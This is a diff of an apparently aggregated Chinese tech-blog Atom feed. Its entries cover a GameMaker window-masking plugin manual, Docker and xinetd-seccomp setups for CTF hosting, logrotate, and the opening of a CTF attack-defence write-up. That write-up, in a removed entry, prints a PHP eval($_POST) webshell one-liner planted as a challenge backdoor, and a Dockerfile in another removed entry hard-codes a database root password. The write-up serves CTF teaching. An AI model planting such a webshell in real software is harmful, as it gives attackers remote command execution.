+<pre class="brush: cpp; title: ; notranslate">
+NF_WS_ShaveWindow(sprite, subimage, x, y);
+NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
+NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
+NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // 仅限 GMS
+</pre>
+
+
+<p>与 draw_sprite_* 系列绘制函数有着十分类似的形式，除了不支持 rot 和  <br>colour参数，同时 alpha 参数有不同的意义。可以理解为将给定的 Sprite / Surface 用提供的参数放置于窗口坐标系内作为遮罩（不经过 View Port 等任何变换），同时将窗口没有被遮罩覆盖的区域给“消去”变为透明：</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" alt="" class="wp-image-654" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/mask-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>“遮罩层”内容</figcaption></figure></div>
+
+
+
+<p>如图所示，红色部分的窗口会被保留下来，其余部分将会被消去。需要注意的是上图所谓的“遮罩层”是一个与窗口同样大小的位于窗口之上的想象出的一层，并不是实际存在的可见图层，其内容仅为了作为遮罩所用，并不会显示出来。</p>
+
+
+
+<p>遮罩层使用的图像为彩色图像带 Alpha 通道。在实际运行时色彩通道会被完全忽略，最终窗口形状仅受遮罩层的 Alpha 通道影响。默认情况下每个 Alpha 通道值为 0 的像素（即纯透明像素）被认为是窗口需要被消去的部分。这个值可以通过上文所述的几个函数中的 alpha 参数（范围 [0, 1.0]）来改变。任何 Alpha 通道值 &lt;= 该参数的像素将被认为是需要消去的。注意，这意味着如果你传入的 alpha 参数为 1，则<strong>任何</strong>像素都会被认定为透明像素。</p>
+
+
+
+<p>另外，如果使用 Surface 来传入遮罩内容，请注意 Surface 的背景需要用透明色填充：</p>
+
+
+<pre class="brush: cpp; highlight: [2]; title: ; notranslate">
+surface_set_target(mask_surface);
+draw_clear_alpha(c_white, 0); // Alpha = 0, 使用的颜色无所谓.
+</pre>
+
+
+<h4>2.3.3 遮罩对齐</h4>
+
+
+
+<p>使用本插件的目的通常是想将游戏窗口的形状，裁剪成游戏绘制的有意义的内容的形状：</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png" alt="" class="wp-image-661" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>游戏实际绘制内容</figcaption></figure></div>
+
+
+
+<p>上图中，女牛仔的部分是有意义的、需要保留的部分，而黑色背景需要被裁剪掉，也就意味着我们在遮罩层“绘制”的遮罩需要与女牛仔的位置、形状相同。</p>
+
+
+
+<p>这乍一听似乎很容易，只要使用相同的 x，y 参数将同样的女牛仔 Sprite 绘制到 Application Surface 和遮罩层即可。但是正如上文所说，用户实际看到的内容是经过 View Port 变换过的，因此其实际显示的坐标和尺寸可能与绘制时传入的参数不同；然而遮罩层是不受 View Port 影响的，因此开发者需要自行计算遮罩层图像的位置和尺寸，用以对齐经过 View Port 变换后的游戏内容。建议不要用过于复杂的 View Port 设置。</p>
+
+
+
+<h4>2.3.4 窗口形状更新时间与绘制事件顺序</h4>
+
+
+
+<p>由于 GM 运行原理所致，游戏绘制的内容并不会在绘制语句执行的瞬间显示出来，而是要等到当前 Step 所有绘制完成后才会刷新绘制缓存以显示绘制的内容。这意味着窗口外形的更新需要与绘制内容的刷新同步发生，否则就会发生窗口形状与所显示内容有所偏差的问题（比如游戏仍然显示的是上一帧的内容，但是窗口形状已经被裁剪成了下一帧所需的形状）：</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" alt="" class="wp-image-669"/></a><figcaption> <br>绘制内容与窗口形状没有同步更新 </figcaption></figure></div>
+
+
+
+<p>由于 Windows 窗口外形更新时机所限，本插件需要在 GM 的每个 Step 中，于每个 Step 开始 （Begin Step）至 Draw 系列事件开始之前对窗口形状进行更新，以保证窗口形状的更新与绘制内容的更新能够同步完成。如果在 Draw 系列事件中进行窗口形状的修改，则会发生窗口形状与绘制内容不同步的问题，请务必注意。建议在 End Step 事件之中更新窗口形状。</p>
+
+
+
+<p>再次提示，请<strong>不要</strong>在 Draw <strong>系列</strong>事件中更新窗口形状！除非你十分清楚可能发生的后果！</p>
+
+
+
+<h3>2.4 复杂遮罩</h3>
+
+
+
+<p>多次执行以下任意核心函数来改变窗口形状，则后一次的遮罩将会覆盖前一次的遮罩，<strong>并不会</strong>互相叠加：</p>
+
+
+<pre class="brush: cpp; title: ; notranslate">
+NF_WS_ShaveWindow(sprite, subimage, x, y);
+NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
+NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
+NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // 仅限 GMS
+</pre>
+
+
+<p>这意味着如果所需的遮罩是由多个元素组合而成的复杂形状，则需要开发者自行准备好已经事先组合好所有元素的<strong>单张</strong> Sprite / Surface 用作实际的遮罩。</p>
+
+
+
+<p>举例来说，如果你需要在屏幕上显示两位女牛仔，那么你需要准备如下的<strong>一张</strong> Sprite / Surface 作为遮罩：</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" alt="" class="wp-image-678" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/complex-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>复杂遮罩</figcaption></figure></div>
+
+
+
+<p>连续调用两次 NF_WS_ShaveWindow_* 函数并不能实现如上所述的需求。假设第一次传入了左侧牛仔的遮罩，第二次传入了右侧的遮罩，则只有右侧会正常显示出来，而第一次设置的遮罩会被覆盖而失效。</p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<h2>3. 常见问题</h2>
+
+
+
+<ol><li>使用 Sprite 做遮罩时要注意所用 Sprite 的 xoffset 和 yoffset。</li></ol>
+<p><a rel="nofollow" href="https://www.noisyfox.io/foxwinshave2.html">FoxWinShave 2 中文使用手册</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
+        <author>
+            <name><![CDATA[狐狸的小小窝]]></name>
+        </author>
+    </entry>
+    
+    <entry>
         <id>https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/</id>
         <title><![CDATA[智能合约攻击面及ctf出题指南]]></title>
         <updated>2019-01-03T00:00:00+08:00</updated>
@@ -1920,244 +2465,6 @@ void start_coroutine(struct Coroutine *co) {
     </entry>
     
     <entry>
-        <id>https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/</id>
-        <title><![CDATA[如何科学的在Docker Container中运行多个服务]]></title>
-        <updated>2018-08-25T13:29:15+08:00</updated>
-        <link href="https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/"/>
-        <content type="text/html" src="https://www.summershrimp.com/2018/08/run-multi-service-in-one-container/"><![CDATA[<p>在一个Docker Container中运行多个服务？打扰了。</p>
-<h1>0x00 前言</h1>
-<p>Docker，或说任何基于<code>内核namespace</code>的轻量级进程隔离技术，在设计之初，都不是为了当作虚拟机使用的。也就是说，其中运行的并不是一个完整的操作系统。包括Docker官方，也是推荐在一个Container内仅运行一个服务。如果需要运行多个服务，应通过<code>docker run --link</code> 或者<code>docker-compose</code>来关联多个容器。但是在实际的应用中，我们经常希望将一个完整的可运行环境打包成一个<code>docker image</code>，不再依赖其他的容器。比如在CTF比赛中，将多个服务打包成一个Image，可以有效地提高在环境受损后恢复的效率。在经历了多场比赛，看过各种大师傅用各种奇怪的姿势完成这个任务后，觉得应该好好的讨论一下这个问题。</p>
-<h1>0x01 错误的姿势</h1>
-<ol>
-<li>使用upstart的启动方式</li>
-</ol>
-<pre><code># Dockerfile
-From ubuntu:14.04
-RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
-ADD web /var/www/html
-RUN service mysql start &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; service mysql stop
-CMD service mysql start &amp;&amp; service apache2 start &amp;&amp; while true; do sleep 10;done
-</code></pre>
-<ol>
-<li>使用systemd的启动方式</li>
-</ol>
-<pre><code># Dockerfile
-From ubuntu:16.04
-RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
-ADD web /var/www/html
-RUN systemctl start mysql &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; systemctl stop mysql
-CMD systemctl start mysql &amp;&amp; systemctl start apache2 &amp;&amp; while true; do sleep 10;done
-</code></pre>
-<ol>
-<li>使用启动脚本启动多个服务</li>
-</ol>
-<pre><code># Dockerfile
-From ubuntu:16.04
-RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install mysql apache2 php7.0 
-ADD web /var/www/html
-ADD entrypoint.sh /sbin/
-RUN chmod +x /sbin/entrypoint.sh /var/www/html/init_sql.sh&amp;&amp; \
-     /etc/init.d/mysql start &amp;&amp; /var/www/html/init_sql.sh &amp;&amp; /etc/init.d/mysql stop
-CMD /sbin/entrypoint.sh
-</code></pre>
-<pre><code>#!/bin/bash 
-
-# entrypoint.sh
-/usr/bin/mysqld start &amp;
-/usr/bin/httpd &amp;
-while true
-do
-sleep 100
-done
-</code></pre>
-<p>在实际中，使用<code>方法1</code>或者<code>方法2</code>很大几率无法完成将多个服务跑在同一个container中的任务。<code>方法3</code>虽然可以，但仍然存在一些问题：</p>
-<ol>
-<li>一旦产生僵尸进程，将无人回收，只有杀掉整个container才能解决。</li>
-<li>在停止container的时候将无人处理<code>SIGTERM</code>等信号。</li>
-<li>很难重启其中某一个服务</li>
-</ol>
-<p><code>方法1</code>和<code>方法2</code>不能成功，是因为docker只是一个进程隔离的沙箱环境，并不是真正的虚拟机。而<code>service xxx start</code> 和<code>systemctl start xxx</code> 分别是<code>upstart</code>和<code>systemd</code>这两个<code>/sbin/init</code>进程的替代者的服务管理命令。而<code>upstart</code>和<code>systemd</code>都要求系统必须是物理机或虚拟机，并不支持作为container的<code>init</code>进程。方法3存在问题是因为，在正常的系统中，<code>init</code>进程永远占用<code>PID=1</code>的位置，回收僵尸进程、处理未处理的信号等都是由<code>init</code>进程帮我们完成的，一个子进程如果失去了父进程，也会由<code>init</code>进程接管。但是在container中，<code>init</code>进程并不存在，<code>PID=1</code>的进程是我们在<code>Dockerfile</code>中定义的<code>Entrypoint</code>或最后一个<code>CMD</code>指定的命令。</p>
-<pre><code>root@vpscn:/var/lib/docker# docker exec -it hackmd sh
-/hackmd # ps -ef
-PID   USER     TIME   COMMAND
-    1 hackmd     1:03 node app.js
-   42 hackmd     0:00 /usr/local/bin/node ./lib/workers/dmpWorker.js
-   62 root       0:00 sh
-   69 root       0:00 ps -ef
-</code></pre>
-<p>因此，对于启动方法3的container，我们应该在启动时加上<code>--init</code>参数，来强制使用<a href="https://github.com/krallin/tini">tini</a>作为<code>init</code>进程。但是就算这样，在服务多了之后，进行重启等操作仍然很繁琐。</p>
-<h1>0x02 推荐的姿势</h1>
-<p>作为一个~~金牌运维~~打杂的，简单谈谈我常用的方法。</p>
-<p>首先推荐一个超级好用的基础镜像<code>phusion/baseimage</code>。截至SUCTF2018环境准备完成时，该镜像的最新版本是<code>0.10.1</code>，基于<code>ubuntu 16.04</code>。我们常用的<code>apt-get</code>等命令都可以无缝兼容。<a href="https://github.com/phusion/baseimage-docker">phusion/baseimage</a> 采用了作者自己开发的一个基于<code>python</code>的<code>init</code>进程作为Container的<code>Entrypoint</code>，采用<code>runit</code>作为服务管理器。这个基础镜像还是在Coding打杂的时候知道的，<a href="https://studio.coding.net">Coding ~~WebIDE~~ Studio</a> 的Web Terminal也是基于这个镜像做的。NUAACTF/SUCTF的PWN题基础镜像<a href="https://github.com/Asuri-Team/ctf-xinetd">ctf-xinetd</a>也是基于这个镜像做的。</p>
-<p>然后直接贴个在SUCTF2018运维期间写的<code>Dockerfile</code></p>
-<pre><code>#Dockerfile
-FROM phusion/baseimage:0.10.1
-MAINTAINER Yibai Zhang &lt;xm1994@outlook.com&gt;
-
-RUN sed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list &amp;&amp;\
-    sed -i 's/security.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list &amp;&amp;\
-    apt-get update &amp;&amp; apt-get install -y apache2 libapache2-mod-php php-mysql mariadb-server &amp;&amp;\
-    apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/* /var/www/html/*
-
-RUN mkdir -p /etc/service/apache2/ &amp;&amp; \
-    printf "#!/bin/sh\n\ntrap \"apachectl -k graceful-stop\" 1 2 3 6 15\n\nexec /usr/sbin/apachectl -D FOREGROUND\n" &gt; /etc/service/apache2/run &amp;&amp;\
-    chmod +x /etc/service/apache2/run &amp;&amp; mkdir -p /etc/service/mysql/ &amp;&amp;\
-    printf "#!/bin/sh\n\ntrap \"mysqladmin -uroot -psuCTF_P1us_1s shutdown\" 1 2 3 6 15\n\nexec /usr/bin/mysqld_safe" &gt; /etc/service/mysql/run &amp;&amp;\
-    mkdir -p /var/run/mysqld/ &amp;&amp; chown mysql:mysql /var/run/mysqld &amp;&amp;\
-    chmod 700 /etc/service/mysql/run /etc/service/apache2/run
-
-COPY web /var/www/html
-COPY flag /flag
-RUN echo "secure-file-priv=/var/www/" &gt;&gt;/etc/mysql/mariadb.conf.d/50-server.cnf &amp;&amp; chmod -R 777 /var/www/html/favicon
-COPY init_sql.sh /tmp/init_sql.sh
-RUN chmod +x /tmp/init_sql.sh &amp;&amp; bash -c "/tmp/init_sql.sh" &amp;&amp; rm /tmp/init_sql.sh
-EXPOSE 80
-</code></pre>
-<pre><code>#!/usr/bin/env bash
-#init_sql.sh
-
-mysqld_safe &amp;   
-echo -n "Waiting for mysql startup"
-while ! mysqladmin --host="localhost" --silent ping ; do
-    echo -n "."
-    sleep 1
-done
-echo
-
-mysql -uroot &lt;&lt;EOF
-UPDATE mysql.user SET Password=PASSWORD('XXXXXX'), plugin = '' WHERE User='root';
-create database calc;
-use calc;
-create table user(
-id INT NOT NULL AUTO_INCREMENT primary key,
-username varchar(32) NOT NULL,
-password varchar(32) NOT NULL
-)ENGINE=InnoDB DEFAULT CHARSET=utf8;
-insert into user values(1,'admin','aa67095d8e65d624548cb6b50bd4778e');
-create table file(
-id INT NOT NULL AUTO_INCREMENT primary key,
-filename varchar(32) NOT NULL,
-filehash varchar(32) NOT NULL,
-sig varchar(120) NOT NULL
-)ENGINE=InnoDB DEFAULT CHARSET=utf8;
-create table flag(
-flag varchar(120) primary key
-)ENGINE=InnoDB DEFAULT CHARSET=utf8;
-insert into flag values('SUCTF{a_very_long_long_long_long_long_fake_flag_d}');
-grant SELECT, INSERT on calc.user to 'suctf'@localhost identified by 'suctf';
-grant SELECT, INSERT, UPDATE on calc.file to 'suctf'@localhost ;
-grant SELECT on calc.flag to 'suctf'@localhost ;
-FLUSH PRIVILEGES;
-EOF
-
-mysqladmin -uroot -pXXXXXX shutdown
-</code></pre>
-<p>这里着重看一下<code>printf "#!/bin/sh\n\ntrap \"apachectl -k graceful-stop\" 1 2 3 6 15\n\nexec /usr/sbin/apachectl -D FOREGROUND\n" &gt; /etc/service/apache2/run</code>，这个命令就是在创建runit启动脚本。具体的说明可以去看<code>phusion/baseimage</code>或者<code>runit</code>的手册。执行完成后会在<code>/etc/service/apache2/run</code>下面生成如下内容的脚本</p>
-<pre><code>#!/bin/sh
-
-trap "apachectl -k graceful-stop" 1 2 3 6 15
-
-exec /usr/sbin/apachectl -D FOREGROUND
-</code></pre>
-<p>这个脚本会作为runit的子进程运行，并将Apache2保持在前台运行。在接收到<code>1 2 3 6 15</code>这几个信号的时候友好的(graceful)结束Apache2。如果在运行中需要重启Apache服务，只需要运行<code>docker exec container_name sv restart apache2</code>即可。通过这种方式，在Container停止的时候也可以通知相关的进程，而不是直接全部杀死，更可以保证服务的完整性。~~虽然在比赛中基本挂了就要恢复环境根本不需要保证完整性。~~</p>]]></content>
-        <author>
-            <name><![CDATA[0xe799bde88f9c]]></name>
-        </author>
-    </entry>
-    
-    <entry>
-        <id>https://www.summershrimp.com/2018/05/xinetd-kafel/</id>
-        <title><![CDATA[xinetd-kafel – 一个更安全的xinetd服务]]></title>
-        <updated>2018-05-12T13:26:27+08:00</updated>
-        <link href="https://www.summershrimp.com/2018/05/xinetd-kafel/"/>
-        <content type="text/html" src="https://www.summershrimp.com/2018/05/xinetd-kafel/"><![CDATA[<p>为了保证CTF解题/渗透赛中PWN服务有更稳定的表现（预防搅屎棍）和CTF攻防赛中有人使用ptrace/seccomp等系统调用做通用防御，我在xinetd中加入了对syscall的过滤。感谢Google的Kafel项目，给编写seccomp bpf代码提供了一种更方便的方法。</p>
-<h1>0x00 前言：为啥要搞这个东西？</h1>
-<p>众所周知，在CTF线下赛中，各大主办方明令禁止使用通用防御软件/规则对赛题进行防御。但是目前在国内外的各大比赛中，PWN题目多用socat或xinetd提供服务。而这两个组建都太过简陋，无法提供精细的系统调用控制，主办方对通防工具的检查多为人工登陆gamebox检查。<br />
-在近日结束的一场线下赛中，某战队向我反馈成功的使用了我在去年编写的一个<a href="https://github.com/Asuri-Team/pwn-sandbox">PWN通防工具</a>苟到了最后（关于这个工具的原理如果有兴趣欢迎star一下对应项目，人数多的话我会再开坑写文章）。<br />
-我也惊讶于主办方竟然对这么大型的通防工具都没有察觉。</p>
-<p>而在CTF解题赛/渗透赛中，虽然有docker这一容器技术可以为pwn题目隔离运行环境，限制运行资源，方便重启等维护工作，但依然难以避免有部分搅屎选手采用诸如<a href="https://zh.wikipedia.org/wiki/Fork%E7%82%B8%E5%BC%B9">Fork炸弹</a>等手段对服务器进行DoS攻击。<br />
-因此，对一些用不到的的系统调用进行限制，也可以大大减少搅屎棍选手的数量。（Docker已直接支持对container内程序进行系统调用限制<a href="https://docs.docker.com/engine/security/seccomp/">Read More</a>）</p>
-<p>因此，<a href="https://github.com/Asuri-Team/xinetd-kafel">xinetd-kafel</a>这一改版的xinetd服务油然而生。</p>
-<h1>0x01 原理：你对xinetd做了点啥？</h1>
-<p>其实修改xinetd让其支持对系统调用的过滤这一想法最早在Defcon 2015 Final时就已被其主办方实现。但主办方并未开源其xinetd代码（也可能是我没找到），而且其只能在xinetd的配置文件中对syscall进行简单的黑白名单过滤，难以有效限制日渐增长的搅屎大军。<br />
-让程序支持syscall过滤通常来讲有两种办法：<br />
-1. ptrace<br />
-2. seccomp<br />
-其中，ptrace就是linux下gdb用来调试程序所使用的syscall，而且其功能如其名，process trace， 用于跟踪进程的各种调用。<br />
-但是由于ptrace使用过于复杂，我们在xinetd中，并未使用这一方式，而采用了seccomp。</p>
-<h2>seccomp是个啥？</h2>
-<p><code>seccomp - operate on Secure Computing state of the process</code><br />
-seccomp 中文直译就是“操作进程的安全计算状态”，其实就是通知内核对进程的系统调用进行限制。几年前CentOS/RedHat Linux默认启用的selinux底层就是使用的这个系统调用对进程进行系统调用限制。当年应该人人装完linux的第一件事就是关掉selinux。现在的Ubuntu和CentOS都已不再默认安装或开启selinux了。<br />
-通过<code>man seccomp</code>我们就能看到seccomp的相关调用方法。</p>
-<pre><code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_XX, args);
-seccomp(SECCOMP_MODE_XX, flags, args);
-</code></pre>
-<p>linux Man page对seccomp的描述非常有歧义，其提供了如上两种接口，这里我把其参数相应的对应了起来。<code>seccomp</code>的第二个参数flags很难查到相关资料，而且在我们的场景下并不影响使用，就不再多做解释。seccomp调用会对当前进程及其子进程生效，如果我们调用seccomp之后，当前进程的系统调用就会被限制。</p>
-<p><code>SECCOMP_MODE_XX</code>共有两种选择：<br />
-1. SECCOMP_MODE_STRICT<br />
-2. SECCOMP_MODE_FILTER</p>
-<p><code>SECCOMP_MODE_STRICT</code> 会将系统调限制在 <code>read, write, _exit (but not exit_group), sigreturn</code>中。 我们可以编写一个小程序测试一下：</p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;linux/seccomp.h&gt;
-#include &lt;linux/filter.h&gt;
-#include &lt;linux/audit.h&gt;
-#include &lt;linux/signal.h&gt;
-#include &lt;sys/prctl.h&gt;
-#include &lt;unistd.h&gt;
-
-int main(void)
-{
-    puts("a");
-    prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT, 0);
-    puts("b");
-    system("echo c");
-    return 0;
-}
-</code></pre>
-<p>编译运行后结果如下：</p>
-<pre><code>xm1994@xm1994-vm:~$ ./a.out 
-a
-b
-Killed
-</code></pre>
-<p>程序在执行到system函数后就提示了Killed。这是因为在执行system时，会调用fork和execve两个系统调用。<br />
-如果我们删掉system()函数后再运行呢？程序依然会提示killed。这个问题是由于在新版的libc中，main函数退出后。libc_start_main会调用exit_group(0)结束程序以及其子进程（感觉是为了防止僵尸进程？），但再旧版的libc中，执行的是exit()。</p>
-<p><code>SECCOMP_MODE_FILTER</code> 模式则允许传入一个过滤器参数，进行自定义的系统调用过滤。</p>
-<h2>这过滤器咋搞啊？</h2>
-<p>seccomp使用的过滤器叫<a href="https://zh.wikipedia.org/wiki/BPF">BPF</a>, 允许在内核中直接设置数据包过滤模式。 我们使用wireshark/tcpdump进行网络抓包时，设置的抓包规则就会被编译成bpf送入内核。在内核中，系统调用流程也会反映在网络数据包（特殊的）的处理流程中（还有很多其他的系统事件也会以数据包的形式存在）。因此，我们也可以通过编译bpf规则到内核中，来自定义seccomp的过滤规则。</p>
-<pre><code> struct sock_fprog {
-    unsigned short      len;    /* Number of BPF instructions */
-    struct sock_filter *filter; /* Pointer to array of
-                                    BPF instructions */
-};
-
-Each program must contain one or more BPF instructions:
-
-struct sock_filter {            /* Filter block */
-    __u16 code;                 /* Actual filter code */
-    __u8  jt;                   /* Jump true */
-    __u8  jf;                   /* Jump false */
-    __u32 k;                    /* Generic multiuse field */
-};
-
-</code></pre>
-<p>bpf规则实际上是在内核中的bpf虚拟机中运行，也就是说他也是一种opcode，因此，我们需要一些工具去生成相应的opcode。一个比较常用的工具是libseccomp，它可以通过一些接口来生成bpf规则代码。但使用libseccomp的话就需要自己写一个parser去调用相关的接口了。万幸，在调研中，我发现了谷歌的某个员工编写的<a href="https://github.com/google/kafel">kafel</a>库, 他可以很方便的将文本描述的过滤规则编译成sock_fprog结构体。</p>
-<h1>0x02 修改：你到底改了点啥？</h1>
-<p>在阅读了xinetd代码后，发现其代码结构是相当的干净易于理解的。我在其配置文件parser中添加了<code>kafel_rule</code> 这一选项，用于指定kafel规则文件。随后将文件编译为sock_fprog结构体保存在每个service的配置中。<br />
-xinetd在接收到连接后会fork出来一个子进程，随后通过dup/dup2进行流重定向。在流重定向完成后，会调用execve执行目标服务程序。这一过程类似于在shell中执行程序并对流重定向，如果读者实现过简易的shell，应该很好理解。<br />
-我们只需要在execve之前调用 <code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, args);</code> 便可对目标服务程序设定seccomp规则。</p>
-<p>这一修改其实十分简单，代码的总变更行数不超过200行。</p>
-<h1>0x03 效果：真管用？</h1>
-<p>当然管用了，不信自己试试。</p>
-<p>这个版本的xinetd我们已经应用到了战队布置pwn题使用的docker image：<a href="https://github.com/Asuri-Team/ctf-xinetd">ctf-xinetd</a>中。欢迎各位大师傅脱下来试用，好用的话别忘点个star~。</p>
-<h1>0x04 目标：理想很丰满</h1>
-<p>这个工具我用了不到六个小时就写完了。之所以这么赶时间，是希望在即将到来的国赛和以后的比赛中，能有主办方使用和推广这一工具，为选手提供更加干净公平的比赛环境。最终目的当然是国内外的所有比赛都能用上这一工具，但是理想很丰满，怕是到最后只有我们战队和比较熟悉的几个战队办比赛才会用吧233333。</p>]]></content>
-        <author>
-            <name><![CDATA[0xe799bde88f9c]]></name>
-        </author>
-    </entry>
-    
-    <entry>
         <id>http://blog.karlrixon.cn/2018/12/03/hello-world/</id>
         <title><![CDATA[Hello World]]></title>
         <updated>2018-02-24T03:48:11+08:00</updated>
@@ -2169,516 +2476,329 @@ xinetd在接收到连接后会fork出来一个子进程，随后通过dup/dup2�
     </entry>
     
     <entry>
-        <id>https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/</id>
-        <title><![CDATA[XMan2017夏令营结业攻防赛Babyblog出题思路&WriteUP]]></title>
-        <updated>2017-08-20T15:21:31+08:00</updated>
-        <link href="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/"/>
-        <content type="text/html" src="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/"><![CDATA[<h1 class="md-end-block md-heading md-focus"><span class="md-expand">XMan 2017 AWD Babyblog author&#8217;s turtoral &amp; writeup</span></h1>
-<h2 class="md-end-block md-heading">0x00 出题思路</h2>
-<h3 class="md-end-block md-heading">常见一句话木马</h3>
-<p><span class="md-line md-end-block">一句话木马是在日常攻击和渗透中使用的最广泛的一类木马，其具有代码量小，变形多，易隐藏等特性。这类一句话木马多为通过eval或类似命令直接执行对应语言的字符串代码，达到可以执行任意命令的效果。在本题中，我一共放置了四种不同类型的一句话木马：</span></p>
-<pre class="lang:default decode:true"># 1. app/template/*.tpl
-eval($_POST[passwd])
+        <id>https://www.noisyfox.io/logrotate.html</id>
+        <title><![CDATA[Logrotate 日志滚动 解决日志占用空间过大]]></title>
+        <updated>2017-05-03T16:23:04+08:00</updated>
+        <link href="https://www.noisyfox.io/logrotate.html"/>
+        <content type="text/html" src="https://www.noisyfox.io/logrotate.html"><![CDATA[<h1>起因</h1>
+<p>前几天发现自己的博客没有办法登录了，每次输完密码登录完都会重新跳回登录界面。一开始是怀疑登录的session出了什么问题，因为浏览器开隐身模式后就能登录进去。然而开隐身模式进后台的时候又会出现403错误，于是打算连进数据库把session删除再试试。</p>
+<p>然而当我试图连接数据库时却一直提示失败，于是试图重启数据库服务，但是系统提示启动失败。电脑坏了怎么办？重启大法！然而数据库服务依旧无法启动，当时我也是摸不着头脑。明明以前一直好好的服务器怎么说炸就炸呢？</p>
+<h1>真相</h1>
+<p>后来我机智的看了下磁盘的占用情况：</p>
+<pre class="brush: bash; title: ; notranslate">df -hl</pre>
+<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png"><img class="aligncenter size-full wp-image-483" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png" alt="df -hl" width="543" height="152" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl.png 543w, https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl-300x84.png 300w" sizes="(max-width: 543px) 100vw, 543px" /></a></p>
+<p>然后我就震惊了！！<span style="color: #000000;"><del>震惊！过气博主硬盘为何被榨干！这背后究竟是人性的&#8230;（啪</del></span></p>
+<p>经过一番折腾，终于找到了问题的所在：</p>
+<pre class="brush: bash; title: ; notranslate">du -sh .</pre>
+<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png"><img class="aligncenter size-full wp-image-484" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png" alt="df -hl" width="481" height="96" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh.png 481w, https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh-300x60.png 300w" sizes="(max-width: 481px) 100vw, 481px" /></a></p>
+<p>Nginx 的日志文件居然占用了14G的空间！Why？</p>
+<h1>论日志</h1>
+<p>日志文件通常情况下是未压缩的明文文本文件，在一个运行时间较长的系统中日志文件的体积会越来越大，甚至远超你的预期。</p>
+<p>默认情况下一个服务的同一个日志流（如 Nginx 默认就有 error.log access.log 两个日志流）是输出到同一个日志文件中的，也就是说随着时间的推移，这一日志文件中包含的日志的天数也会越来越多，这就给查看某一特定时间段的日志带来了麻烦（试想一下在一个容量10G，包含了一整年数据的日志文件中查找5月份的日志信息，而且还没有日志辅助工具的帮助，是一件多么痛苦的事情）。并且如果日志文件占用了过大的存储空间，那么人们通常会优先删除最老的日志，保留最近一段时间的日志。如果所有日志信息都储存在同一个文件中，那么想要只删除部分数据也不是一件轻松的活。</p>
+<p>再者，日志数据通常都是纯文本数据，并且内容重复度非常之高，如果能够将其压缩存储，那么会大大减小体积。然而日志系统是没有办法将数据追加到一个压缩过的日志文件中去的。如果要压缩日志，那么势必需要将日志数据划分成新、旧两部分，其中旧日志压缩后单独存放，新日志即是当前系统活动的日志文件，仍然是纯文本形式。</p>
+<p>综上所述，一个好的日志系统至少需要满足以下几个需求：</p>
+<ul>
+<li>能够将日志按一定规律拆分成多个文件</li>
+<li>能够将非活动的日志压缩</li>
+<li>能够控制日志文件体积和数量，当条件满足时自动删除旧日志以释放空间</li>
+<li>日志文件名满足一定规律便于排序和筛选</li>
+</ul>
